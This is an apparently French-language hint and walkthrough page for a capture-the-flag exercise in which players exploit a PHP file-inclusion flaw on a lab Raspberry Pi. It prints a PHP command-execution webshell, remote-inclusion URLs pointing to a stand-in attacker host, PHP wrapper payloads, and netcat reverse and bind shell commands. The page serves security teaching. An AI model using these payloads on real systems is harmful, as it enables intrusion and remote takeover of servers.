<!DOCTYPE html>
<!--[if IE 8]> <html lang="fr" class="ie8"> <![endif]-->  
<!--[if IE 9]> <html lang="fr" class="ie9"> <![endif]-->  
<!--[if !IE]><!--> <html lang="fr"> <!--<![endif]-->  
<head>
    <title>Documentation</title>
    <!-- Meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">    
    <link rel="shortcut icon" href="favicon.ico">  
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
    <!-- Global CSS -->
    <link rel="stylesheet" href="assets/plugins/bootstrap/css/bootstrap.min.css">   
    <!-- Plugins CSS -->    
    <link rel="stylesheet" href="assets/plugins/font-awesome/css/font-awesome.css">
    <link rel="stylesheet" href="assets/plugins/prism/prism.css">
    <link rel="stylesheet" href="assets/plugins/lightbox/dist/ekko-lightbox.min.css">
    <link rel="stylesheet" href="assets/plugins/elegant_font/css/style.css">

    <!-- Theme CSS -->
    <link id="theme-style" rel="stylesheet" href="assets/css/styles.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    
</head> 

<body class="body-pink">
    <div class="page-wrapper">
        <!-- ******Header****** -->
        <header id="header" class="header">
            <div class="container">
                <div class="branding">
                    <h1 class="logo">
                        <a href="index.html">
                            <span aria-hidden="true" class="icon_documents_alt icon"></span>
                	    <span class="text-bold">Documentation</span>
                        </a>
                    </h1>
                </div><!--//branding-->
                <ol class="breadcrumb">
                    <li><a href="index.html">Accueil</a></li>
                    <li class="active">Exploitation Web</li>
                </ol>
            </div><!--//container-->
        </header><!--//header-->
        <div class="doc-wrapper">
            <div class="container">
                <div id="doc-header" class="doc-header text-center">
                    <h1 class="doc-title"><span aria-hidden="true" class="icon  icon_globe-2"></span> Exploitation Web</h1>
                    <div class="meta"><i class="fa fa-clock-o"></i> Dernière mise à jour: 28 Février 2018</div>
                </div><!--//doc-header-->
                <div class="doc-body">
                    <div class="doc-content">
                       <section id="presentation" class="doc-section">
                                <h2 class="section-title">Présentation</h2>
                                <div id="synopsis"  class="section-block">
                                    <h3 class="block-title">Synopsis</h3>
                                    <p>Depuis le passage du maléfique Dr Horrible, un drôle de point d'accès Wifi est apparu ... Il semblerait que la carte électronique responsable de ce point d'accès soit un composant important de la bombe.
				<div class="callout-block callout-info">
								        <div class="icon-holder">
								            <i class="fa fa-info-circle"></i>
								        </div><!--//icon-holder-->
								        <div class="content">
								            <h4 class="callout-title">Votre mission</h4>
								            <p>obtenir un accès à distance sur le Raspberry Pi ! Connectez vous au réseau sans fil, examinez les services ouverts, trouvez une vulnérabilité exploitable et exploitez le pour ouvrir un shell à distance.</p>
                                        </div><!--//content-->
                                    </div>
                                    </p>
				<div id="connection" class="section-block">
                                        <h3 class="block-title">Connection au serveur WiFi</h3>
                                        <p><code><u>SSID:</u> DrHorriblesBombChallenge</code></p>
                                        <p><code><u>Clé:</u> drhorrible </code></p>
					<p>Il arrive parfois que le point d'accès refuse, sans raison apparente, les connexions. Si vous êtes dans cette situation, perséverez. Cette situation est générée par un dongle WiFi de mauvaise facture, et au bout de deux ou trois essais vous devriez être connectés.</p>
					</div>
				<div id="niveaux" class="section-block">
                                        <h3 class="block-title">C'est parti !</h3>
					<p>Cette page de documentation est séparée en trois parties, selon le niveau du joueur en sécurité informatique. Vous pouvez sélectionner l'un des trois boutons ci dessous, pour accéder à la présentation des indices spécifiques à votre niveau.</p>
				<div class="row" style="margin:10px;text-align:center;">
                                        <div class="col-md-4 col-sm-4 col-xs-12">
                                            <a href="#debutant" class="scrollto btn btn-green"><span class="icon icon_lifesaver"></span> Niveau Débutant</a>
					</div>
                                        <div class="col-md-4 col-sm-4 col-xs-12">
                                            <a href="#intermediaire" class="scrollto btn btn-orange"><span class="icon icon_mug_alt"></span> Niveau Intermédiaire</a>
					</div>
                                        <div class="col-md-4 col-sm-4 col-xs-12">
                                            <a href="#expert" class="scrollto btn btn-red"><span class="icon icon_genius"></span> Niveau Expert</a>
					</div>    
					                                             
                                </div>
<p>Si vous n'avez jamais pratiqué d'exploitation Web et/ou que vous ne connaissez pas les vulnérabilités les plus courantes liées à cet environnement, sélectionnez le niveau débutant.</p>
<p>Si vous êtes bloqués, n'hésitez pas à nous contacter ... Vous pouvez également visionner la solution directement en fin de page</p>
					<div class="row">
						<div class="col-md-12 col-sm-12 col-xs-12" style="text-align:center">
						    <a href="#solution" class="scrollto btn btn-blue">Solution</a>
						</div>  
					</div>
					</div>
                                </div><!--//section-block-->
                                
                            </section><!--//doc-section-->
                       <section id="expert" class="doc-section">
                                <h2 class="section-title"><span class="icon icon_genius"></span>  Niveau Expert</h2>
                                <div class="section-block">
                                    <p>Evidemment, si vous êtes en train de lire cette section, vous n'avez pas trop envie qu'on vous spoile le challenge ;) Pas de soucis, on vous comprends ! Quelques règles à suivre cependant, pour être sûr que vous prenez le bon axe pour la suite :</p>
<div class="row">
<div class="col-md-6 col-sm-6 col-xs-6">
<h3>- Le serveur SSH, tu ignoreras </h3>
<h3>- Le bruteforce, tu oublieras</h3>
<h3>- La simplicité, tu chercheras</h3>
<h3>- La vulnérabilité, tu trouveras</h3>
<h3>- La solution de feignasse, tu éviteras</h3>
<h3>- Un shell interactif, tu obtiendras</h3>
</div>
<div class="col-md-6 col-sm-6 col-xs-6">
<p style="text-align:center"><img src="assets/images/challenge/yoda.png" /> </p>
</div>
</div>
                                </div><!--//section-block-->
                       </section><!--//doc-section-->
                       <section id="intermediaire" class="doc-section">
                                <h2 class="section-title"><span class="icon icon_mug_alt"></span>  Niveau Intermédiaire</h2>
                                <div class="section-block">
                                    <p>Pour ce niveau, nous partons du principe que vous avez déjà quelques connaissances sur les exploitations web et la recherche de vulnérabilités. Voici donc quelques indices, qui pourraient bien se révéler utile pour la suite.</p>
<h3 id="scandeports" class="block-title">Scan de ports</h3>
<p>Il se pourrait que vous ayiez à réaliser un scan de port, pour déterminer les services disponibles sur l'hôte cible. Une première question à se poser pourrait être ... mais quel est l'hôte cible ?</p>
<p>Pour cela, vous pouvez utiliser l'excellent scanner de ports <code>nmap</code>. Voici un rappel de quelques options de nmap :</p>
<code>nmap &lt;hôtes à scanner&gt; &lt;options facultatives&gt;</code>
<p> - <strong> Les hôtes à scanner</strong> : vous pouvez spécifier une adresse IP de la forme <em>10.0.0.1</em>, un rang d'adresses de la forme <em>10.0.0-255.1-254</em>, un sous réseau de la forme <em>10.0.0.0/24</em>
</p>
<p>
- <strong> Les options facultatives </strong> : 
<h6> Le type de scan</h6>
<ul>
<li><em>-sS :</em> SYN Scan</li>
<li><em>-sT :</em> Connect() Scan</li>
<li><em>-sA :</em> ACK Scan</li>
<li><em>-sW :</em> Window Scan</li>
<li><em>-sM :</em> Maimon Scan</li>
</ul>
<h6> La liste des ports à scanner</h6>
-p1-65535 pour scanner les ports 1 à 65535
<h6> Les informations supplémentaires</h6>
<ul><li><em>-O :</em> détection de l'OS</li>
<li><em>-A :</em> scan détaillé (détection de l'OS, détection des services et de leurs versions, traceroute)</li>
</ul>
</p>
<h3 id="recherchevuln" class="block-title">La recherche de la vulnérabilité</h3>
<p>
Pour découvrir la vulnérabilité, ne cherchez pas trop loin ! Il s'agit d'une vulnérabilité bien connue et bien documentée, et il est probable que vous la connaissiez déjà. Le fichier concerné est typique de ce type de failles PHP.
</p>
<p>La vulnérabilité est située côté serveur (c'est plus pratique pour obtenir un shell sur le serveur !), mais elle n'est pas forcément accessible directement. Un petit travail d'investigation risque d'être nécessaire, n'hésitez pas à décortiquer les codes sources que vous avez à disposition.
</p>
<p> Une précision, cependant : ce challenge n'exige absolument aucun bruteforce ou recherche par dictionnaire. Il n'est pas non plus nécessaire de sniffer le réseau Wifi, ou quoi que ce soit de cette nature.</p>
<h3 id="exploitation-inter" class="block-title">L'exploitation</h3>
<p>Une fois la vulnérabilité découverte, il est possible de l'exploiter d'au moins trois manières, plus ou moins élégantes, mais la démarche sera toujours d'obtenir un Web shell. Si vos connaissances en PHP commencent à dater un peu, voici une proposition de script, mais vous pouvez évidemment développer le votre si vous préférez :</p>
<div class="code-block">
<pre><code class="language-php">&lt;?php 
if ($_GET && isset($_GET['cmd'])) {
	system($_GET['cmd']);
} 
else
{
	echo "Aucune commande entrée !";
}
?&gt;
</code></pre>
</div>
 <p>Voici quelques indices potentiellement utiles :</p>
 <p><h5>Méthode 1 (facile)</h5> Vous pouvez partir du principe que le serveur est configuré de façon très permissive. Cela devrait vous permettre de mettre en place rapidement l'attaque. Une information intéressante : pour rapidement déployer un serveur web statique, vous pouvez utiliser la commande python suivante :
</p>
<code>python -m SimpleHTTPServer</code>
<p>Par défaut, ce mini serveur sert les fichiers statiques dans le dossier courant, et est en écoute sur le port 8000.</p>
<p><h5>Méthode 2 (facile)</h5> Vous pouvez également tirer profit d'une fonctionnalité méconnue de PHP : <em>les wrappers</em>. Cela évite, notamment, d'avoir à mettre en place un serveur web chez l'attaquant. Il s'agit de fonctions PHP ordinaires, sauf qu'elles peuvent être utilisées exactement comme si on utilisait un fichier. Dans le cas de cette attaque, la présence de ces wrappers relève presque du Cheat Code ! Voici quelques exemples :</p>
<ul>
<li><strong>data://text/plain;base64,&lt;payload PHP encodé en base 64&gt; :</strong> en utilisant ce wrapper comme un fichier, le payload PHP sera exécuté</li>
<li><strong>php://filter/read=convert.base64-encode/resource=&lt;le fichier local à lire&gt;:</strong> en utilisant ce wrapper, vous pouvez récupérer le code source de n'importe quel fichier local et le récupérer en base64</li>
<li><strong>php://input :</strong> Ce wrapper permet d'attendre la prochaîne requête : c'est exactement comme si il était en attente du payload. Pour réaliser la requête attendue, on peut utiliser <code>nc 192.168.666.42 80 &lt; scriptmalveillant.txt</code></li>
</ul>
<h5>Méthode 3 (difficile)</h5>
<p> Il est également possible de réaliser cette attaque en s'intéressant à un type de fichiers particuliers : les logs. N'oublions pas que chaque requête du client vers le serveur est enregistrée dans ces fichiers. Il s'agit de <em>/var/log/apache2/access.log</em>.</p>
<p>Il est possible de se servir de cette information pour imaginer un scénario d'exploitation menant à l'obtention d'un WebShell sur la machine cible.</p>
<div class="callout-block callout-warning">
                                        <div class="icon-holder">
                                            <i class="fa fa-bug"></i>
                                        </div><!--//icon-holder-->
                                        <div class="content">
                                            <h4 class="callout-title">Attention !</h4>
                                            <p>Nous avons un peu "joué" avec les permissions des fichiers de logs d'apache pour permettre cette exploitation. En temps normal, l'utilisateur apache a un droit en écriture sur ces logs, mais pas en lecture, ce qui rend impossible l'attaque que nous vous proposons.</p>
                                        </div><!--//content-->
                                    </div><!--//callout-block-->
	
                                </div><!--//section-block-->
<h3 id="webshell2interactiveshell" class="block-title">Du WebShell au shell Interactif</h3>
<p> Grâce aux indices précédents, vous avez dû réussir à trouver et exploiter la vulnérabilité : vous disposez donc, à ce stade, d'un webshell fonctionnel.</p>
<p> Cependant, ce type d'interface n'est pas vraiment "simple" à utiliser, ni très confortable. Or, dans la suite, nous risquons d'avoir à faire un usage intensif de cet interpréteur de commande. Nous vous suggérons donc fortement (après, vous faites comme vous voulez, hein !) de mettre en place un bind shell ou un reverse shell grâce à <code>netcat</code>.
<p>Netcat est un couteaux suisse à destination du réseau et des protocoles TCP/UDP. Il permet notamment de connecter un service (ici, un interpréteur de commande type /bin/sh) à un port ouvert, pour que d'autres puissent s'y connecter. Nous vous proposons donc deux stratégies pour obtenir ce shell : la mise en place d'un <strong>Reverse Shell</strong> ou celle d'un <strong>Bind Shell</strong></p>
<div class="row">
<div class="col-md-6 col-sm-6 col-xs-6">
<h3> Le Reverse Shell </h3>
<p>C'est la cible qui va se connecter sur l'attaquant en écoute, et rediriger son shell /bin/bash vers l'attaquant</p>
<div><u>Sur l'hôte cible :</u></div>
<code>nc &lt;IP attaquant&gt; &lt;port&gt; -e /bin/bash</code>
<div><u>Sur l'hôte attaquant :</u></div>
<code> nc -lvp &lt;port&gt;</code>
</div>
<div class="col-md-6 col-sm-6 col-xs-6">
<h3> Le Bind Shell </h3>
<p>La cible se met en écoute sur un port donné, et redirige entrées et sorties de /bin/bash vers le port ouvert, l'attaquant se connecte directement sur le port concerné.</p>
<div><u>Sur l'hôte cible :</u></div>
<code>nc -lvp &lt;port&gt; -e /bin/bash</code>
<div><u>Sur l'hôte attaquant :</u></div>
<code> nc &lt;IP cible&gt; &lt;port&gt;</code>
</div>
</div>
                       </section><!--//doc-section-->
                       <section id="debutant" class="doc-section">
                                <h2 class="section-title"><span class="icon icon_lifesaver"></span>  Niveau Débutant</h2>
                                <div class="section-block">   
                                    <div id="connection" class="section-block">
                                        <h3 id="collectedinfos" class="block-title">Collecte d'informations</h3>
					<p>Lorsque l'on est dans la démarche d'exploiter une vulnérabilité sur un serveur distant pour en prendre le contrôle, la première étape est généralement d'effectuer une phase de collecte d'informations. Cela permet notamment de récupérer un certain nombre d'informations qui pourront se révéler importantes par la suite : ainsi, on pourra récupérer des informations telles que le système d'exploitation sur le système cible, ainsi que la liste des services accessibles à distance.</p>
<h4>1. Adressage réseau</h4>
					<p>Dans le cas présent, nous sommes connectés sur le même réseau local que la machine cible. Sur un tel réseau local, chaque machine se voit assignée une adresse IP : il s'agit d'une suite de 4 nombres entiers, séparés par des points, qui permettent d'identifier de façon unique un réseau et chaque ordinateur connecté à réseau. Dans notre cas, l'adresse IP identifiant le réseau est ainsi formée :
</p>
<p  style="text-align:center"><code>192.168.4.x</code></p>
<p> Ici, le dernier nombre composant l'adresse IP permettra d'identifier les différents ordinateurs connectés sur le réseau local de la bombe. L'adresse IP de la bombe, par exemple, est la suivante :
</p>
<p  style="text-align:center"><code>192.168.4.1</code></p>
<p>Une information qui peut se révéler intéressante par la suite est l'adresse IP de votre ordinateur sur ce réseau local : en effet, lorsque vous vous êtes connectés au réseau, votre ordinateur a automatiquement contacté un serveur DHCP, chargé de lui attribuer dynamiquement une adresse IP libre. Pour obtenir cette information sur une distribution GNU/Linux, vous pouvez taper la commande : <code>ifconfig</code>. Voici un exemple de ce que vous pourriez obtenir :</p>
<p style="text-align:center"><code style="text-align:left">
eno1: flags=4099&lt;UP,BROADCAST,MULTICAST>  mtu 1500<br ∕>
        ether 08:2e:5f:71:6d:30  txqueuelen 1000  (Ethernet)<br ∕>
        RX packets 0  bytes 0 (0.0 B)<br ∕>
        RX errors 0  dropped 0  overruns 0  frame 0<br ∕>
        TX packets 0  bytes 0 (0.0 B)<br ∕>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br ∕>
<br ∕>
lo: flags=73&lt;UP,LOOPBACK,RUNNING>  mtu 65536<br ∕>
        inet 127.0.0.1  netmask 255.0.0.0<br ∕>
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host><br ∕>
        loop  txqueuelen 1000  (Boucle locale)<br ∕>
        RX packets 38367  bytes 21274667 (20.2 MiB)<br ∕>
        RX errors 0  dropped 0  overruns 0  frame 0<br ∕>
        TX packets 38367  bytes 21274667 (20.2 MiB)<br ∕>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br ∕>
<br ∕>
wlp10s0b1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500<br ∕>
        inet <span class="greencode">192.168.4.2</span>  netmask 255.255.255.0  broadcast 192.168.4.255<br ∕>
        inet6 fe80::c95:5f04:9ce9:b689  prefixlen 64  scopeid 0x20&lt;link><br ∕>
        ether c0:18:85:58:98:99  txqueuelen 1000  (Ethernet)<br ∕>
        RX packets 1433330  bytes 1559807139 (1.4 GiB)<br ∕>
        RX errors 0  dropped 0  overruns 0  frame 0<br ∕>
        TX packets 896447  bytes 107997959 (102.9 MiB)<br ∕>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br ∕>

</code></p>
<p> Dans notre cas, on est donc dans la configuration suivante :</p>
<p style="text-align:center"><img src="assets/images/challenge/adressage.png" /> </p>
<h4>2. Scan de ports</h4>
<p>Maintenant que nous disposons de la configuration du réseau local, et notamment de l'adresse de la cible, nous pouvons nous intéresser plus spécifiquement à cet hôte en particulier. Une démarche intéressante est d'effectuer un scan de ports : en effet, sur un ordinateur, de nombreux services peuvent être rendus disponibles par le réseau. Pour contacter un service en particulier, il faut connaître le port sur lequel il est accessible : un ordinateur comporte ainsi un certain nombre de ports ouverts, correspondant aux services mis à disposition par la machine, les autres ports étant fermés (et donc inaccessibles). Pour trouver des services exploitables, il est intéressant d'utiliser un scanner de ports : il va tenter de contacter chacun des ports de l'hôte visé afin de déterminer ceux qui sont ouverts et les services auxquels ils correspondent. Cela nous servira de point de départ pour chercher des vulnérabilités exploitables dans les différents services.</p>
<p> Il existent de nombreuses manières de réaliser un tel scan, mais l'une des plus connue est appelée le SYN Scan : il consiste à envoyer un paquet TCP SYN d'établissement de la connexion. Si l'hôte distant répond par un paquet ACK (acquittement), alors le port est ouvert, et un service disponible. Si l'hôte répond par un paquet RST (reset), cela signifie que le port est fermé.</p>
<p> Pour réaliser un tel scan, il est possible d'utiliser l'outil très complet <code>nmap</code>. Il nous permet également de détecter quel service est disponible lorsqu'un port est ouvert, et quel système d'exploitation est exécutée par la cible. Ce sont des informations très pertinentes pour un attaquant !</p>
<p> Pour réaliser ce scan, vous pouvez utiliser nmap avec les options -A (pour déterminer le système d'exploitation et les services disponibles) et -sS (pour spécifier un scan de type SYN). La syntaxe générale est donc la suivante :</p>
<p style="text-align:center"><code>sudo nmap -A -sS &lt;adresse IP Cible&gt;</code></p>
<p> Vous devriez normalement détecter un serveur Web bien connu sur le port 80. C'est particulièrement intéressant pour un attaquant, car les serveurs Web sont très courants, et permettent d'héberger sites et applications web potentiellement vulnérables. La <strong>surface d'attaque</strong> est donc considérablement augmentée dans une configuration de ce type. Dr Horrible aurait il pu laisser passer une vulnérabilité web ? </p>
<h4>3. Recherche de la vulnérabilité</h4>
<p>Pour le découvrir, nous pouvons explorer le site "à la main", en utilisant un navigateur web. Il nous suffit de nous connecter à l'adresse <code>http://192.168.4.1</code> pour accéder à une mystérieuse page web ...</p>
<p style="text-align:center"><img height="400px" width="800px" src="assets/images/challenge/website.png" /> </p>	
<p>Un site web est constitué de plusieurs technologies, fréquemment amenées à travailler ensemble. Certaines de ces technologies s'exécutent du côté du client (c'est à dire sont exécutées directement par votre navigateur lorsque vous vous connectez sur le site web) tandis que d'autres sont exécutées du côté du serveur (que vous contactez lorsque vous demandez à accéder à une page web).
</p>
<p style="text-align:center"><img height="250px" src="assets/images/challenge/modeleclientserveur.png" /></p>
<p>Les technologies clients principalement utilisées sont HTML, CSS et Javascript. Leurs objectifs sont différents : le HTML est un langage de description de contenu, fortement basé sur la syntaxe XML, il sert à structurer le contenu (texte, images, vidéos) de la page web. Cette base est indispensable, mais elle peut être enrichie par du CSS (Cascading Style Sheet), qui est un langage de description de l'apparence de la page (il sert à mettre en place et décrire le design du site web) et par du Javascript, qui est un langage permettant d'exécuter du code pour animer la page et la rendre interactive.</p>
<p> Du côté des technologies serveur, il est théoriquement possible d'utiliser n'importe quel langage, mais certaines technologies ont été conçues spécifiquement pour cet usage. C'est notamment le cas du langage PHP : il s'agit d'un langage de programmation côté serveur, il est donc fréquemment utilisé pour générer du code HTML, Javascript et CSS pour qu'il soit utilisé par le client. Utiliser un langage pour générer du code côté serveur permet de créer dynamiquement des pages, "sur mesure" (cela peut par exemple permettre d'utiliser une base de données, ou d'interagir avec d'autres composants logiciels côté serveur).</p>
<p>Chacune de ces technologies comporte son lot de vulnérabilités exploitables. Cependant, notre objectif pour cette étape est d'obtenir un shell à distance sur le serveur, il paraît donc préférable de chercher des vulnérabilités côté serveur : nous chercherons donc des pages dont l'extension est ".php", indiquant la présence d'un script s'exécutant en PHP côté serveur.</p>
<p> Ici, il n'y a qu'une seule page accessible directement, et aucun lien ne nous permet de conclure à la présence d'une autre page à investiguer. Nous sommes tombé directement sur cette page en tapant l'adresse <code> http://192.168.4.1/</code>, il s'agit donc soit d'une page "index.html", qui contient un code statique (la page était stockée telle quelle côté serveur), soit d'une page "index.php" qui a généré un contenu HTML dynamiquement (auquel cas nous pourrions inspecter cette page à la recherche d'une vulnérabilité).</p>
<p>
Si on essaie d'accéder à la page <code>http://192.168.4.1/index.php</code>, on constate qu'elle n'existe pas : la page sur laquelle nous nous trouvons n'est donc pas générée dynamiquement, il faut chercher ailleurs ...
</p>		
<p>
Une démarche intéressante pour poursuivre notre investigation serait d'afficher le code source de la page, à la recherche d'une page PHP. En effet, le compteur affiché change régulièrement sans interaction de la part de l'utilisateur : il semble donc synchronisé avec le compteur de la bombe. Ainsi, un code Javascript peut, par l'intermédiaire d'une technologie nommée "AJAX", faire appel à une page PHP côté serveur pour récupérer une information actualisée ... Pour commencer votre investigation, tapez <code>Ctrl + U</code> pour afficher le code source. N'hésitez pas à parcourir les différents fichiers utilisés par le code HTML de la page, à la recherche d'une page PHP.
</p>		

        <h3 id="exploitation" class="block-title">L'Exploitation</h3>
<p>Vous devriez avoir trouver le fichier PHP concerné par la requête AJAX. Il s'appelle <code>read.php</code> et une information intéressante peut être notée : il est suivi d'un point d'interrogation suivi de la chaîne de caractères <code>file=compteur</code> </p>
<p>Il s'agit d'une information supplémentaire qui est transmise au script PHP. Le script est capable de récupérer cette information, transmise par l'utilisateur directement dans la barre d'adresse (il s'agit alors d'une argument transmis par le verbe GET) pour s'en servir pour effectuer la tâche qui lui est assignée.</p>
<h4>1. La faille include (File Inclusion)</h4>
<p> Si vous êtes un peu familiers avec le langage PHP, vous avez dû reconnaître une faille typique de cette technologie : une vulnérabilité par inclusion de fichiers.</p>
<p> En effet, il semble que ce script, d'après son nom et l'argument attendu ("file" veut dire fichier en anglais), utilise une des fonctions d'inclusion de PHP (elles sont au nombre de 4 : include, include_once, require et require_once, mais leur exploitation est similaire) pour inclure le fichier proposé par l'utilisateur (nommé "compteur" dans le cas de la requête AJAX). Nous pouvons confirmer qu'il s'agit bien d'un fichier existant sur le serveur en essayant d'y accéder directement pour vérifier son existence :</p>
<p style="text-align:center"><code>http://192.168.4.1/compteur</code></p>
<p>Cette vulnérabilité est particulièrement intéressante pour l'attaquant, car elle va permettre d'inclure n'importe quel fichier dans le script PHP : cela nous permet donc potentiellement de lire un fichier sensible stocké sur le disque dur du serveur. Et si on essayait ? </p>
<p>Historiquement, le fichier <strong>/etc/passwd</strong> contenait les noms d'utilisateurs et les mots de passes des différents utilisateurs de l'ordinateur sur lesquels il était stocké. Ce n'est plus le cas aujourd'hui, mais il reste possible de découvrir les différents utilisateurs de la machine. Essayons de le lire grâce à notre script, en accédant à l'adresse : </p>
<p style="text-align:center"><code>http://192.168.4.1/read.php?file=/etc/passwd</code></p>
<p> Vous devriez obtenir l'affichage suivant :</p>
<p style="text-align:center"><img src="assets/images/challenge/passwd.png" /></p>
<p> Victoire, notre fichier a bien été inclus ! Mais comment utiliser cette vulnérabilité pour obtenir notre shell à distance ?</p>
<h4>2. Local File Inclusion vs. Remote File Inclusion</h4>
<p> En effet, une inclusion de fichier contrôlable par l'utilisateur est très intéressante, car si on réussit à inclure un fichier contenant du code PHP (il est signalé entre les balises <strong>&lt;?php</strong> et <strong>?&gt;</strong>), le code PHP inclus sera exécuté. Dans notre cas, cela nous permettra par exemple d'utiliser un utilitaire nommé <code>netcat </code> pour obtenir un accès à distance.</p>
<p>Mais comment exploiter cette vulnérabilité ? En réalité, cela dépend de la configuration du serveur web. Il est possible, bien que peu fréquent, que le serveur web soit mal configuré et autorise l'inclusion de fichiers à distance, situés sur un autre serveur web : il s'agit alors d'une <strong>Remote File Inclusion</strong> (inclusion de fichiers à distance). Dans ce cas, l'exploitation est très simple : il suffit de mettre en ligne le fichier contenant le code PHP malveillant à exécuter, puis d'inclure ce fichier. Par exemple, si on a uploadé notre fichier sur le serveur web accessible à l'adresse <code>http://leserveurdumechant.com/mechantscript.txt</code>, il nous suffira pour exploiter la vulnérabilité de nous rendre à l'adresse :</p>
<p style="text-align:center"><code>http://192.168.4.1/read.php?file=http://leserveurdumechant.com/mechantscript.txt</code></p>
<p>
Dans la plupart des cas, il n'est pas possible d'inclure un fichier distant, car la configuration du serveur apache (et notamment le fichier de configuration de PHP <strong>php.ini </strong>) ne l'autorise pas. Dans ce cas, l'attaquant est contraint d'inclure un fichier <strong>déjà</strong> présent sur le disque dur local du serveur cible. C'est ce qu'on appelle une <strong> Local File Inclusion</strong> (Inclusion de Fichier Local). Dans ce cas, il est nécessaire d'inclure soit un fichier que l'attaquant a réussi à uploader sur le serveur (via une autre faille touchant à une fonctionnalité d'upload, par exemple), soit d'inclure les logs du serveur Apache (après avoir fait en sorte qu'ils contiennent du code PHP, par exemple en réalisant une requête erronée contenant le code malveillant), soit d'utiliser une fonctionnalité un peu obscure de PHP nommée PHP Wrappers (il s'agit de fonctions PHP qui se comportent comme des fichiers).
</p>
<p><em>Dans le cas d'une première exploitation, nous vous conseillons de tenter d'exploiter la Remote File Inclusion. Elle est moins complexe dans sa mise en place, et vous permettra de mieux comprendre les mécanismes à l'oeuvre.</em> </p>
<h4>3. Un Webshell PHP</h4>
<p>Pour réaliser l'attaque, vous aurez besoin d'un code d'exploitation en PHP. L'objectif, dans notre cas, est de pouvoir exécuter une commande sur l'ordinateur cible : nous vous proposons donc un code PHP simplissime, qui vous permettra, une fois inclus, de pouvoir exécuter n'importe commande dans le serveur comme si vous étiez dans un interpréteur de commande.</p>
<div class="code-block">
<pre><code class="language-php">&lt;?php 
if ($_GET && isset($_GET['cmd'])) {
	system($_GET['cmd']);
} 
else
{
	echo "Aucune commande entrée !";
}
?&gt;
</code></pre>
</div>
<p>Ce code, très simple, va vous permettre d'entrer n'importe quelle commande bash et de l'exécuter sur la cible. Le test conditionnel (if) va vérifier que le tableau $_GET (c'est le tableau contenant les arguments transmis directement dans l'URL, c'est le cas de l'argument file de read.php par exemple) existe, et que l'argument <strong>cmd</strong> a bien été transmis par l'utilisateur.</p>
<p> Si c'est le cas, le script va transmettre l'argument de l'utilisateur à la fonction <code>system</code>. Le rôle de cette fonction est d'exécuter cette commande dans l'interpréteur proposé par le système d'exploitation (ici, ce sera donc du Bash étant donné qu'on est dans un environnement GNU/Linux) et d'afficher le retour de la commande sur la page.</p>
<p> Si ce n'est pas le cas, le script va utiliser la fonction d'affichage <code>echo</code> pour afficher le message : "Aucune commande entrée !".</p>
<p> Finalement, il va être nécessaire de mettre en place sur votre ordinateur un serveur web très simple, pour que vous puissiez inclure le fichier depuis la cible. Pour cela, vous pouvez utiliser la commande bash suivante :</p>
<code>python -m SimpleHTTPServer</code>
<p> Cette commande, très pratique, utilise une fonctionnalité de l'interpréteur python qui va créer un petit serveur web statique dans le dossier où vous l'appelez, rendant ainsi accessible le fichier texte dans lequel vous aurez stocké votre webshell. Dès lors, vous pourrez exploiter la faille pour exécuter votre code PHP malveillant !</p>
 <div class="callout-block callout-warning">
                                        <div class="icon-holder">
                                            <i class="fa fa-bug"></i>
                                        </div><!--//icon-holder-->
                                        <div class="content">
                                            <h4 class="callout-title">Attention !</h4>
                                            <p>Par défaut, la commande python va ouvrir un serveur web sur le port 8000, faites donc attention à bien accéder à ce port lors de l'inclusion ! Pour rappel, pour se connecter sur un serveur web sur la machine d'IP <b>10.0.0.1</b> sur le port 6666, vous devez taper dans la barre d'adresse du navigateur :<code>http://10.0.0.1:6666/</code></p>
                                        </div><!--//content-->
                                    </div><!--//callout-block-->
	</div>
<h4>4. Un Bind Shell avec netcat</h4>

<p>A ce stade, vous disposez d'un interpréteur de commande sommaire grâce au webshell PHP. Cependant, cette solution n'est pas très pratique ... Il serait plus agréable de disposer d'un interpréteur interactif à distance. Pour réaliser cela, il est possible d'utiliser l'outil <code>netcat</code>.</p>
<p style="text-align:center"><img src="assets/images/challenge/bindshell.jpg" /></p>
<p>Netcat est un utilitaire "à tout faire" dans le domaine du réseau. Il permet de réaliser de nombreuses opérations en lien avec le réseau. Dans notre cas, il va nous permettre de rediriger vers un port quelconque un interpréteur de commande, tel que <strong>/bin/sh</strong> ou <strong>/bin/bash</strong>. Il sera alors possible de se connecter sur ce port avec une autre instance de netcat pour taper des commandes en direct sur la bombe.</p>
<p>Pour mettre en place un bind shell, il faut :</p>
<p>- <strong>Sur la machine cible</strong>, mettre netcat en écoute sur le port <em>x</em> et rediriger l'interpréteur /bin/bash dessus :</p>
<div><code>nc -lvp &lt;x&gt; -e /bin/bash</code></div>
<p>- <strong>Sur la machine attaquante</strong>, connecter netcat sur le port <em>x</em> de la machine cible :</p>
<code>nc &lt;IP cible&gt; &lt;x&gt;</code>
<p> A l'issu de ce chapitre, vous devriez disposer d'un interpréteur de commande interactif satisfaisant sur la bombe. Félicitations ! Une dernière astuce : pour rendre l'interpréteur plus intuitif, vous pouvez entrer la commande python suivante une fois votre bind shell obtenu : </p>
<code>python -c 'import pty; pty.spawn("/bin/bash")'</code>
                                </div><!--//section-block-->
                       </section><!--//doc-section-->
 			<section id="solution" class="doc-section">
                                <h2 class="section-title"><span class="icon icon_key_alt"></span>   La Solution</h2>
                                <div class="section-block">
                                    <p style="text-align:center;"><button id="btnsolution" onclick="switcherSolution()" class="btn btn-blue">Afficher la solution</button></p>
					
				<div style="display:none;"id="lasolutioncachee">
<p>Il fallait, pour réussir cette étape du challenge, exploiter la vulnérabilité par inclusion de fichiers qui se trouve dans le fichier <strong>read.php</strong>. Ce script PHP pouvait être découvert en explorant le code AJAX utilisé par la page principale pour renvoyer la nouvelle valeur du fichier compteur.</p>
